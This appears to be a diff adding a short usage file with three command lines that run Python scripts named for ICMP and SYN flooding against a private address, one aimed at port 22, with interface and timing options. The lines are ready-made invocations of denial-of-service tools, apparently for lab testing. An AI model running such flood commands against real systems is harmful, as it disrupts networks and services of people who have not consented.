@@ -1,0 +1,5 @@
+python icmp_flood_win.py 192.168.1.109 -iface "Intel(R) Wi-Fi 6 AX201 160MHz"
+
+python icmp_flood_win.py 192.168.1.109 -c 10 -iface "Intel(R) Wi-Fi 6 AX201 160MHz" -v
+
+python syn_flood.py 192.168.1.109 22 -i 0.001 -iface "Intel(R) Wi-Fi 6 AX201 160MHz" -v
